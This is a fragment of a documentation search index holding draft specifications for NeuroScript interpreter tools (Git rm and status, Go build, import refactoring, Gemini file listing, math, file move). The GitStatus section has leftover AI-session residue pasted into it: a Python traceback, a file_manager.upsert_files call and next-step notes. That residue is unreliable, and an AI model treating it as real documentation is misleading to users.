<code>toolExec</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_rm/","title":"git_rm","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitrm-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitAdd, Git.GitCommit, FS.DeleteFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_rm/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_rm/#tool-specification-gitgitrm-v01","title":"Tool Specification: <code>Git.GitRm</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitRm</code> (v0.1)</li> <li>Purpose: Removes a specified file from the Git index (staging area) and typically also removes it from the working directory. This is equivalent to running <code>git rm &lt;path&gt;</code> within the project's sandbox directory. It does not remove directories recursively (use <code>git rm -r</code> functionality is not exposed by this tool).</li> <li>NeuroScript Syntax: <code>CALL Git.GitRm(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path (within the sandbox) of the file to be removed from the Git index and working directory.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating the file was successfully removed from the index, potentially including output from the <code>git rm</code> command. Example: <code>\"Successfully removed path 'config.old' from git index.\\nOutput:\\nrm 'config.old'\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to path validation errors (e.g., \"invalid path for GitRm '...'\") or errors from the underlying <code>git rm</code> command execution (e.g., \"failed to remove path '...': fatal: pathspec '...' did not match any files\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>path</code> argument against the <code>sandboxDir</code>. If validation fails, returns an error message string.</li> <li>Constructs a command equivalent to <code>git rm \"&lt;path&gt;\"</code>.</li> <li>Executes the <code>git rm</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, path does not match a file in the index), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including the path specified and any standard output from the <code>git rm</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git rm</code> command within the configured sandbox directory.</li> <li>Modifies the Git index (staging area) and typically deletes the file from the working directory. Deletions from the working directory are generally permanent unless recovered through Git history.</li> <li>Uses <code>SecureFilePath</code> to ensure the path specified is within the sandbox before passing it to <code>git rm</code>.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create, add, commit, then remove a file\nCALL FS.WriteFile(\"obsolete_file.txt\", \"This file will be removed.\")\nCALL Git.GitAdd([\"obsolete_file.txt\"])\nCALL Git.GitCommit(\"Add obsolete file for removal test\")\n\nEMIT \"Removing file 'obsolete_file.txt' from Git...\"\nCALL Git.GitRm(\"obsolete_file.txt\")\nSET rm_status = LAST\nEMIT \"Git Rm status: \" + rm_status\n# Need to commit the removal\nCALL Git.GitCommit(\"Remove obsolete_file.txt\")\nEMIT \"Commit removal status: \" + LAST\n\n# Example 2: Attempt to remove a file that is not tracked or doesn't exist\nEMIT \"Attempting to remove non-tracked file 'untracked_data.log'...\"\nCALL Git.GitRm(\"untracked_data.log\")\nSET not_tracked_status = LAST\nEMIT \"Status for removing non-tracked file: \" + not_tracked_status\n# Expect error like: \"failed to remove path 'untracked_data.log': fatal: pathspec 'untracked_data.log' did not match any files\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitRm</code></li> <li>Spec Name: <code>GitRm</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>errors</code></li> <li>Helpers: <code>core.SecureFilePath</code>, <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_status/","title":"git_status","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: spec-tool-git-status-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_types.go, pkg/core/tools_git_status.go :: howToUpdate: Review parsing logic and return map structure against implementation in tools_git_status.go. Update version if behavior changes.  </p>"},{"location":"ns/tools/git_status/#tool-specification-toolgitstatus-v01","title":"Tool Specification: <code>TOOL.GitStatus</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.GitStatus</code> (v0.1)</li> <li>Purpose: Gets the current Git repository status by executing <code>git status --porcelain -b --untracked-files=all</code>, parsing the output, and returning a structured map summarizing the status.</li> <li>NeuroScript Syntax: <code>CALL TOOL.GitStatus()</code></li> <li>Arguments: None.</li> <li>Return Value: (<code>ArgTypeAny</code> - Represents a Map)<ul> <li>A NeuroScript Map containing the following keys:<ul> <li><code>branch</code> (String | null): The current local branch name (e.g., \"main\", \"(detached HEAD)\", \"(unknown unborn)\"). Null if parsing fails severely.</li> <li><code>remote_branch</code> (String | null): The remote tracking branch name (e.g., \"origin/main\"), if tracked. Null otherwise.</li> <li><code>ahead</code> (Integer): Number of commits the local branch is ahead of the remote branch. Defaults to 0 if not applicable.</li> <li><code>behind</code> (Integer): Number of commits the local branch is behind the remote branch. Defaults to 0 if not applicable.</li> <li><code>files</code> (List[Map]): A list of files with status changes. Each map has:<ul> <li><code>path</code> (String): The file path relative to the repository root. Handles quoted paths correctly.</li> <li><code>index_status</code> (String): Single character code for the index/staging area status (e.g., 'M', 'A', 'D', 'R', 'C', 'U', '?'). Space ' ' indicates unmodified in index.</li> <li><code>worktree_status</code> (String): Single character code for the working tree status (e.g., 'M', 'D', '?'). Space ' ' indicates unmodified in worktree.</li> <li><code>original_path</code> (String | null): The original path for renamed ('R') or copied ('C') files. Null otherwise.</li> </ul> </li> <li><code>untracked_files_present</code> (Boolean): True if any untracked files (status <code>??</code>) were detected.</li> <li><code>is_clean</code> (Boolean): True if there are no changes to tracked files in the index or working tree (i.e., <code>index_status</code> and <code>worktree_status</code> are both ' ' for all tracked files). Note: Presence of untracked files does not make <code>is_clean</code> false.</li> <li><code>error</code> (String | null): An error message string if the <code>git</code> command failed (e.g., not a git repository, command not found) or critical parsing failed, otherwise <code>null</code>.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided. Returns an error if arguments are present.</li> <li>Determines the execution directory (respecting sandbox settings if active).</li> <li>Executes the command <code>git status --porcelain -b --untracked-files=all</code> in the determined directory.</li> <li>Checks for execution errors. If the command fails (e.g., not a git repository), populates the <code>error</code> field in the return map and returns the map immediately.</li> <li>If the command succeeds, parses the standard output line by line:<ul> <li>Parses the first line (<code>## ...</code>) to extract branch name, remote tracking branch, and ahead/behind counts using regular expressions. Handles detached HEAD and unborn branch states.</li> <li>Parses subsequent lines representing file statuses (<code>XY path</code>, <code>?? path</code>, <code>R new -&gt; old</code>).</li> <li>Extracts the two-character status code (<code>XY</code>), the file path (handling quotes and the <code>-&gt;</code> separator for renames/copies).</li> <li>Populates the <code>files</code> list with maps for each file entry.</li> <li>Sets the <code>untracked_files_present</code> flag if any <code>??</code> status is found.</li> <li>Calculates the <code>is_clean</code> flag based on whether any tracked files have non-space status codes.</li> </ul> </li> <li>Returns the populated map. If parsing the branch line fails critically, the <code>error</code> field may be set.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes an external <code>git</code> command. The execution environment and command inputs are managed internally by the <code>toolExec</code> helper, which should respect sandboxing defined by the interpreter's <code>sandboxDir</code>.</li> <li>Does not directly modify files, only reads status information.</li> </ul> </li> <li>Examples: <code></code>text?code_stderr&amp;code_event_index=3 Traceback (most recent call last):   File \"\", line 1, in  ModuleNotFoundError: No module named 'google.cloud' <p>```neuroscript     # Get the current status     VAR status_map = CALL TOOL.GitStatus()</p> <pre><code># Check for errors first\nIF status_map[\"error\"] != null THEN\n    EMIT \"Error getting git status: \" + status_map[\"error\"]\nELSE\n    # Print branch and clean status\n    EMIT \"Current Branch: \" + status_map[\"branch\"]\n    IF status_map[\"is_clean\"] == true THEN\n        EMIT \"Repository is clean.\"\n    ELSE\n        EMIT \"Repository has changes.\"\n    END\n    IF status_map[\"untracked_files_present\"] == true THEN\n        EMIT \"Untracked files are present.\"\n    END\n\n    # List modified files\n    VAR changed_files = status_map[\"files\"]\n    IF CALL List.Length(changed_files) &gt; 0 THEN\n        EMIT \"Changed Files:\"\n        FOR EACH file_info IN changed_files DO\n            # Example: Print files modified in the worktree\n            IF file_info[\"worktree_status\"] != \" \" THEN\n               EMIT \"- [\" + file_info[\"index_status\"] + file_info[\"worktree_status\"] + \"] \" + file_info[\"path\"]\n               IF file_info[\"original_path\"] != null THEN\n                   EMIT \"    (from \" + file_info[\"original_path\"] + \")\"\n               END\n            END\n        ENDBLOCK\n    END\nEND\n```\n</code></pre> <ul> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git_status.go</code></li> <li>Core Go Packages: <code>os/exec</code>, <code>strings</code>, <code>regexp</code>, <code>strconv</code>, <code>bytes</code>.</li> <li>Helper: Relies on <code>toolExec</code> for command execution.</li> <li>Registration: Registered in <code>pkg/core/tools_git.go</code> (or a dedicated registration file) via <code>registerGitTools</code>. Return type specified as <code>ArgTypeAny</code>. Argument validation uses <code>if len(args) != 0</code>. \"\"\"</li> </ul> </li> </ul>"},{"location":"ns/tools/git_status/#create-the-new-markdown-file-using-file_manager","title":"Create the new Markdown file using file_manager","text":"<p>print(file_manager.upsert_files([     file_manager.File(path='docs/ns/tools/git_status.md', content=git_status_md_content, state=file_manager.FileState.UPDATED) # Use UPDATED to create or overwrite ]))</p>"},{"location":"ns/tools/git_status/#plan-next-steps","title":"Plan next steps","text":""},{"location":"ns/tools/git_status/#1-add-tests-pkgcoretools_git_testgo","title":"1. Add tests: pkg/core/tools_git_test.go","text":""},{"location":"ns/tools/git_status/#2-update-checklist-docsdevelopment-checklistmd","title":"2. Update checklist: docs/development checklist.md","text":"<p>print(\"Plan: Next step is to add tests for TOOL.GitStatus in pkg/core/tools_git_test.go.\")</p>"},{"location":"ns/tools/go_build/","title":"go_build","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-shell-gobuild-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_shell.go, pkg/core/tools_register.go, docs/script_spec.md :: relatedTo: Shell.ExecuteCommand, Shell.GoCheck, Shell.GoTest :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/go_build/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/go_build/#tool-specification-shellgobuild-v01","title":"Tool Specification: <code>Shell.GoBuild</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Shell.GoBuild</code> (v0.1)</li> <li>Purpose: Compiles Go packages and their dependencies within the sandbox directory. This is primarily used to check for compilation errors or produce executable binaries. Equivalent to running <code>go build [target]</code>.</li> <li>NeuroScript Syntax: <code>CALL Shell.GoBuild([target: &lt;String&gt;])</code></li> <li>Arguments:<ul> <li><code>target</code> (String): Optional. The build target package(s) or file(s). Can be a package path (e.g., <code>./cmd/mytool</code>), a pattern (e.g., <code>./...</code> to build all packages within the current module), or a specific Go file. Defaults to <code>./...</code> if omitted. The path is validated to be within the sandbox.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>Returns a Map containing the results of the <code>go build</code> command execution, identical in structure to the <code>Shell.ExecuteCommand</code> result. (Accessible via <code>LAST</code> after the <code>CALL</code>). Keys:<ul> <li><code>stdout</code> (String): Standard output (usually empty for <code>go build</code> unless errors occur related to package listing).</li> <li><code>stderr</code> (String): Standard error (contains compilation errors, warnings, or other messages from the build process).</li> <li><code>exit_code</code> (Number): The exit code of the <code>go build</code> command (0 for success, non-zero for failure).</li> <li><code>success</code> (Boolean): <code>true</code> if the build completed successfully (exit code 0), <code>false</code> otherwise.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that zero or one argument (<code>target</code>) of type String is provided.</li> <li>If <code>target</code> is provided, validates it using <code>SecureFilePath</code> against the current working directory (which should ideally match the <code>sandboxDir</code>). Returns an error map if validation fails. If <code>target</code> is \".\", it's treated as valid.</li> <li>Sets the build target: uses the validated <code>target</code> if provided, otherwise defaults to <code>./...</code>.</li> <li>Constructs the command: <code>go build &lt;build_target&gt;</code>.</li> <li>Executes the <code>go build</code> command using the <code>Shell.ExecuteCommand</code> tool logic (within the interpreter's <code>sandboxDir</code>).</li> <li>Captures <code>stdout</code>, <code>stderr</code>, <code>exit_code</code>, and <code>success</code> status from the execution.</li> <li>Returns the result Map. Compilation errors will be present in <code>stderr</code> and reflected in <code>exit_code</code> and <code>success</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>go build</code> command, which involves running the Go compiler and potentially downloading dependencies via <code>go get</code>. While generally safe for valid Go code, ensure the Go toolchain itself is secure and that dependency sources are trusted.</li> <li>The optional <code>target</code> argument is validated using <code>SecureFilePath</code>, but the build process might read files outside the immediate target (e.g., other packages in the module, module cache in <code>GOPATH</code>).</li> <li>Runs within the interpreter's configured <code>sandboxDir</code> via the underlying call to <code>toolExecuteCommand</code>.</li> <li>Depends on <code>Shell.ExecuteCommand</code>'s security model.</li> <li>Assumes the <code>go</code> executable is available in the environment's PATH.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Build all packages in the current module\nEMIT \"Attempting to build all packages ('./...')...\"\nCALL Shell.GoBuild() # No target, defaults to './...'\nSET build_all_result = LAST\n\nIF build_all_result[\"success\"] == true THEN\n    EMIT \"Build successful!\"\n    EMIT \"Output (stderr should be empty): \" + build_all_result[\"stderr\"]\nELSE\n    EMIT \"Build failed!\"\n    EMIT \"Exit Code: \" + build_all_result[\"exit_code\"]\n    EMIT \"Error Output (stderr):\"\n    EMIT build_all_result[\"stderr\"]\nENDIF\n\n# Example 2: Build a specific package (assuming ./cmd/mytool exists)\nEMIT \"Attempting to build specific package './cmd/mytool'...\"\nCALL Shell.GoBuild(\"./cmd/mytool\")\nSET build_specific_result = LAST\n\nIF build_specific_result[\"success\"] THEN\n    EMIT \"Build of ./cmd/mytool successful.\"\nELSE\n    EMIT \"Build of ./cmd/mytool failed. Stderr:\"\n    EMIT build_specific_result[\"stderr\"]\nENDIF\n\n# Example 3: Attempt to build invalid target path (validation failure)\nCALL Shell.GoBuild(\"../../../outside_project\")\nSET build_invalid_result = LAST\nEMIT \"Build Invalid Path Success Status: \" + build_invalid_result[\"success\"] # Expect false\nEMIT \"Build Invalid Path Error: \" + build_invalid_result[\"stderr\"] # Expect path error\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_shell.go</code></li> <li>Function: <code>toolGoBuild</code></li> <li>Spec Name: <code>GoBuild</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>path/filepath</code></li> <li>Helpers: <code>core.SecureFilePath</code>, <code>core.toolExecuteCommand</code></li> <li>Registration: Registered by <code>registerShellTools</code> within <code>pkg/core/tools_register.go</code>. Returns the result map from the underlying <code>toolExecuteCommand</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/go_update_imports_for_moved_package/","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/go_update_imports_for_moved_package/#tool-specification-toolgoupdateimportsformovedpackage-v01","title":"Tool Specification: <code>TOOL.GoUpdateImportsForMovedPackage</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.GoUpdateImportsForMovedPackage</code></li> <li>Purpose: Scans Go source files within a specified scope and automatically updates import paths for symbols that were moved during a package refactoring. Specifically designed for cases where symbols from a single original package (e.g., <code>pkg/core</code>) are split into multiple new sub-packages (e.g., <code>pkg/core/tools/fs</code>, <code>pkg/core/internal</code>).</li> <li>NeuroScript Syntax: <code>CALL TOOL.GoUpdateImportsForMovedPackage(refactored_package_path, scan_scope)</code></li> <li>Arguments:<ul> <li><code>refactored_package_path</code> (String): Required. The full import path of the original package whose contents have been moved (e.g., <code>\"neuroscript/pkg/core\"</code>). This path is used to identify relevant import statements and as a base for finding the new sub-packages.</li> <li><code>scan_scope</code> (String): Required. The directory path from which to start scanning recursively for <code>.go</code> files to update (e.g., <code>\".\"</code> for the project root). This path will be validated using <code>SecureFilePath</code>.</li> </ul> </li> <li>Return Value: (Map)<ul> <li><code>modified_files</code> (List[String] | null): A list of the full paths of files that were successfully modified. <code>null</code> if a catastrophic error occurred.</li> <li><code>skipped_files</code> (Map[String]String | null): A map where keys are paths of files that were parsed but not modified (e.g., didn't import the target package, no relevant symbols used) and values are the reason. <code>null</code> if a catastrophic error occurred.</li> <li><code>failed_files</code> (Map[String]String | null): A map where keys are paths of files that encountered errors during processing (parsing, analysis, modification, writing) and values are the error messages. <code>null</code> if a catastrophic error occurred.</li> <li><code>error</code> (String | null): A general error message if the tool encounters a fatal issue preventing it from operating (e.g., invalid arguments, critical failure scanning scope, unable to build symbol map), otherwise <code>null</code>.</li> </ul> </li> <li>Behavior:<ol> <li>Validates arguments (<code>refactored_package_path</code>, <code>scan_scope</code>). Returns <code>ErrValidationArgCount</code> or <code>ErrValidationTypeMismatch</code> if invalid.</li> <li>Validates <code>scan_scope</code> using <code>SecureFilePath</code>. Returns an error if validation fails.</li> <li>Build Symbol Map (Internal Complexity): The tool must determine the mapping between exported symbols previously in <code>refactored_package_path</code> and their new package locations. It attempts this automatically:<ul> <li>It constructs the expected filesystem path corresponding to <code>refactored_package_path</code> (e.g., <code>$GOPATH/src/neuroscript/pkg/core</code> or <code>./pkg/core</code> in module mode).</li> <li>It recursively scans <code>.go</code> files within the subdirectories of this path (e.g., <code>./pkg/core/tools/fs</code>, <code>./pkg/core/internal</code>).</li> <li>It parses these files to identify exported symbols (functions, types, vars, consts) and maps them to their new full import path (e.g., build internal map <code>{\"ReadFile\": \"neuroscript/pkg/core/tools/fs\", \"Interpreter\": \"neuroscript/pkg/core/internal\", ...}</code>).</li> <li>If this automatic detection fails or is ambiguous, the tool should return a top-level <code>error</code>. Robust implementation of this step is critical and challenging.</li> </ul> </li> <li>Recursively finds all <code>.go</code> files within the validated <code>scan_scope</code>, excluding files within the refactored package's own new subdirectories (to avoid self-modification issues if structure changes).</li> <li>For each relevant <code>.go</code> file found:<ul> <li>Attempt to parse the file (<code>go/parser</code>). Record error in <code>failed_files</code> on failure.</li> <li>Analyze the AST for import declarations matching <code>refactored_package_path</code> (potentially with aliases). If none found, record in <code>skipped_files</code>.</li> <li>Identify all qualified identifiers used that originate from the <code>refactored_package_path</code> import (e.g., <code>ReadFile</code>, <code>alias.SomeType</code>).</li> <li>For each used identifier's symbol (e.g., <code>ReadFile</code>), look up its new package path from the internal symbol map (Step 3). Record error in <code>failed_files</code> if a used symbol cannot be mapped.</li> <li>Determine the set of new distinct import paths required based on the successfully mapped symbols.</li> <li>Modify the AST's import block: Remove the original import spec for <code>refactored_package_path</code>. Add new import specs for the required new paths (using <code>astutil.AddImport</code> or similar). Handle potential naming collisions if aliases were not used originally.</li> <li>Note: This version (v0.1) focuses only on correcting the <code>import</code> statements. It does not attempt to automatically update the qualifiers in the code (e.g., changing <code>ReadFile</code> to <code>fs.ReadFile</code>). This would require more complex analysis and transformation, potentially as a separate tool or later version. The resulting code might require manual qualifier updates or fail to compile until qualifiers are fixed.</li> <li>Format the potentially modified AST (<code>go/format</code>).</li> <li>Write the formatted code back to the original file path. Record error in <code>failed_files</code> on failure.</li> <li>If modification and write were successful, add the file path to <code>modified_files</code>. If parsing occurred but no relevant imports/symbols were found or mapping failed, ensure it's in <code>skipped_files</code> or <code>failed_files</code> respectively.</li> </ul> </li> <li>Returns the result map containing <code>modified_files</code>, <code>skipped_files</code>, <code>failed_files</code>, and <code>error</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Relies on <code>SecureFilePath</code> for the <code>scan_scope</code>.</li> <li>Modifies Go source files in place; critical to run this on a clean Git branch or with backups.</li> <li>The complexity of Go AST parsing, analysis, and modification introduces risks of incorrect transformations. Thorough testing on diverse codebases is essential.</li> </ul> </li> <li>Examples: <pre><code># Assume pkg/core was split into pkg/core/tools/fs and pkg/core/internal\n# Module path is \"neuroscript\"\nEMIT \"Attempting to update imports related to pkg/core refactor...\"\nVAR result = CALL TOOL.GoUpdateImportsForMovedPackage(\n    refactored_package_path = \"neuroscript/pkg/core\",\n    scan_scope = \".\"\n)\n\nIF result.error != null THEN\n    EMIT \"Fatal error running import update tool: \", result.error\nELSE\n    EMIT \"Import update process completed.\"\n    IF result.modified_files != null AND CALL List.Length(result.modified_files) &gt; 0 THEN\n        EMIT \"Modified files:\"\n        FOREACH f IN result.modified_files\n            EMIT \"- \", f\n        END\n    END\n    IF result.failed_files != null AND CALL Map.Size(result.failed_files) &gt; 0 THEN\n        EMIT \"Files with errors:\"\n        FOREACH f, err IN result.failed_files\n            EMIT \"- \", f, \": \", err\n        END\n        EMIT \"Manual review and potentially qualifier updates needed.\"\n    END\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: Suggest <code>pkg/core/tools_go_refactor.go</code>.</li> <li>Core Go Packages: <code>go/ast</code>, <code>go/parser</code>, <code>go/token</code>, <code>go/format</code>, <code>path/filepath</code>, <code>strings</code>, <code>golang.org/x/tools/go/packages</code> (potentially useful for symbol resolution), <code>golang.org/x/tools/go/ast/astutil</code>.</li> <li>Implementation Detail: The symbol mapping (Step 3) is the hardest part. It likely requires parsing the destination packages first. Consider edge cases like symbols defined in <code>*_test.go</code> files.</li> <li>Implementation Detail: Handling import aliases correctly during both detection and addition is crucial.</li> <li>Register the function (e.g., <code>toolGoUpdateImports</code>) in <code>pkg/core/tools_register.go</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/list_api_files/","title":"list_api_files","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-list-api-files-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go  :: howToUpdate: Update if return value structure changes or pagination/filtering is added.</p> <p># Tool Specification: TOOL.ListAPIFiles (v0.1)</p> <ul> <li>Tool Name: TOOL.ListAPIFiles (v0.1)</li> <li>Purpose: Retrieves a list of files previously uploaded to the Gemini File API that are associated with the currently configured API key.</li> <li>NeuroScript Syntax: <pre><code>apiFilesList := TOOL.ListAPIFiles()\n</code></pre></li> <li>Arguments:<ul> <li>None.</li> </ul> </li> <li>Return Value: (List)<ul> <li>On success: A list where each element is a Map representing a file stored in the API. Each map contains keys like:<ul> <li><code>name</code> (String): The unique API resource name (e.g., \"files/abc123xyz\").</li> <li><code>displayName</code> (String): The user-provided or default display name.</li> <li><code>mimeType</code> (String): The detected MIME type.</li> <li><code>sizeBytes</code> (Number): The size of the file in bytes.</li> <li><code>createTime</code> (String): Creation timestamp (RFC3339 format).</li> <li><code>updateTime</code> (String): Last update timestamp (RFC3339 format).</li> <li><code>state</code> (String): Current state (e.g., \"ACTIVE\", \"PROCESSING\", \"FAILED\").</li> <li><code>uri</code> (String): The <code>aipi://</code> URI for referencing the file in prompts (available when ACTIVE).</li> <li><code>sha256Hash</code> (String): Hex-encoded SHA256 hash of the file content.</li> <li><code>videoMetadata</code> (Map|null): Video-specific metadata if applicable, otherwise null.</li> </ul> </li> <li>On failure: An error (e.g., API connection issues, authentication errors). If listing fails mid-way, the returned list might contain partial results along with a final map containing an <code>error</code> key describing the failure. A Go-level error will also be returned to the interpreter.</li> </ul> </li> <li>Behavior:<ol> <li>Checks if the internal GenAI client is initialized. Returns an error if not.</li> <li>Calls the Gemini File API's <code>ListFiles</code> endpoint.</li> <li>Iterates through all available files associated with the API key.</li> <li>For each file, creates a map containing its metadata.</li> <li>Returns the list of file metadata maps.</li> <li>If an error occurs during iteration, returns the partial list collected so far and propagates the error.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> to be configured in the environment where the NeuroScript interpreter runs.</li> <li>Network access to Google Cloud services is required.</li> <li>The listed files might contain sensitive information depending on what was previously uploaded.</li> </ul> </li> <li>Examples: <pre><code>// Get all files currently in the API storage\nallFiles := TOOL.ListAPIFiles()\nIO.Print(\"Files found in API:\")\nFOR fileInfo IN allFiles DO\n    IF fileInfo[\"error\"] != null THEN\n        IO.Print(\"  Error encountered during listing:\", fileInfo[\"error\"])\n        BREAK // Stop processing list if error occurred\n    END\n    IO.Print(\"  - Name:\", fileInfo[\"name\"], \", Display:\", fileInfo[\"displayName\"], \", Size:\", fileInfo[\"sizeBytes\"])\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolListAPIFiles</code>.</li> <li>Uses <code>interpreter.GenAIClient().ListFiles()</code>.</li> <li>Requires handling pagination using <code>google.golang.org/api/iterator</code>.</li> <li>Registered via <code>registerFileAPITools</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/maths/","title":"maths","text":"<p>:: type: NSproject :: subtype: tool_spec_summary :: version: 0.1.0 :: id: tool-spec-summary-math-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_math.go, docs/script_spec.md :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/maths/#tool-specification-summary-math-tools-v01","title":"Tool Specification Summary: Math Tools (v0.1)","text":"<p>This document provides an abbreviated overview of the built-in Math tools. Note that number arguments can often accept strings that are convertible to numbers.</p>"},{"location":"ns/tools/maths/#tool-mathadd","title":"Tool: <code>Math.Add</code>","text":"<ul> <li>Purpose: Calculates the sum of two numbers.</li> <li>Syntax: <code>CALL Math.Add(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The first number to add.</li> <li><code>num2</code> (Number): Required. The second number to add.</li> </ul> </li> <li>Returns: (Number) The sum (<code>num1 + num2</code>). Result is float64.</li> <li>Example: <code>CALL Math.Add(5, 3.5)</code> -&gt; <code>LAST</code> will be <code>8.5</code>.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathsubtract","title":"Tool: <code>Math.Subtract</code>","text":"<ul> <li>Purpose: Calculates the difference between two numbers.</li> <li>Syntax: <code>CALL Math.Subtract(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The number to subtract from.</li> <li><code>num2</code> (Number): Required. The number to subtract.</li> </ul> </li> <li>Returns: (Number) The difference (<code>num1 - num2</code>). Result is float64.</li> <li>Example: <code>CALL Math.Subtract(10, 4)</code> -&gt; <code>LAST</code> will be <code>6.0</code>.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathmultiply","title":"Tool: <code>Math.Multiply</code>","text":"<ul> <li>Purpose: Calculates the product of two numbers.</li> <li>Syntax: <code>CALL Math.Multiply(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The first number.</li> <li><code>num2</code> (Number): Required. The second number.</li> </ul> </li> <li>Returns: (Number) The product (<code>num1 * num2</code>). Result is float64.</li> <li>Example: <code>CALL Math.Multiply(6, 7)</code> -&gt; <code>LAST</code> will be <code>42.0</code>.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathdivide","title":"Tool: <code>Math.Divide</code>","text":"<ul> <li>Purpose: Calculates the division of two numbers, returning a float. Handles division by zero.</li> <li>Syntax: <code>CALL Math.Divide(num1: &lt;Number&gt;, num2: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Number): Required. The dividend.</li> <li><code>num2</code> (Number): Required. The divisor.</li> </ul> </li> <li>Returns: (Number | Error) The quotient (<code>num1 / num2</code>). Result is float64. Returns an error if <code>num2</code> is zero.</li> <li>Example: <code>CALL Math.Divide(10, 4)</code> -&gt; <code>LAST</code> will be <code>2.5</code>. <code>CALL Math.Divide(5, 0)</code> -&gt; Returns an error.</li> </ul>"},{"location":"ns/tools/maths/#tool-mathmodulo","title":"Tool: <code>Math.Modulo</code>","text":"<ul> <li>Purpose: Calculates the modulo (remainder) of the division of two integers. Handles division by zero.</li> <li>Syntax: <code>CALL Math.Modulo(num1: &lt;Integer&gt;, num2: &lt;Integer&gt;)</code></li> <li>Arguments:<ul> <li><code>num1</code> (Integer): Required. The dividend (must be an integer).</li> <li><code>num2</code> (Integer): Required. The divisor (must be an integer).</li> </ul> </li> <li>Returns: (Number | Error) The integer remainder (<code>num1 % num2</code>). Returns an error if <code>num2</code> is zero.</li> <li>Example: <code>CALL Math.Modulo(10, 3)</code> -&gt; <code>LAST</code> will be <code>1</code>. <code>CALL Math.Modulo(10, 0)</code> -&gt; Returns an error.</li> </ul>"},{"location":"ns/tools/move_file/","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/move_file/#tool-specification-toolmovefile-v01","title":"Tool Specification: <code>TOOL.MoveFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.MoveFile</code></li> <li>Purpose: Moves or renames a file or directory within the allowed filesystem sandbox defined by <code>SecureFilePath</code>.</li> <li>NeuroScript Syntax: <code>CALL TOOL.MoveFile(source, destination)</code></li> <li>Arguments:<ul> <li><code>source</code> (String): Required. The path to the existing file or directory to move, relative to the sandboxed root.</li> 